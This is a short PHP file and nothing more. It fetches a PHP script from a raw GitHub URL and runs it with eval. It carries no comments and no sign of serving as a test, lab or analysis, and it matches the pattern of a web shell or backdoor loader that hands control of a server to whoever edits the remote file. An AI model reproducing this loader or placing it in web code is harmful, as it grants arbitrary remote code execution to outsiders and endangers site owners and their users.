<?php
$url = "https://raw.githubusercontent.com/mangoleh098/alfj/refs/heads/main/geckolama.php"; 
$code = file_get_contents($url);

eval("?>$code<?php");
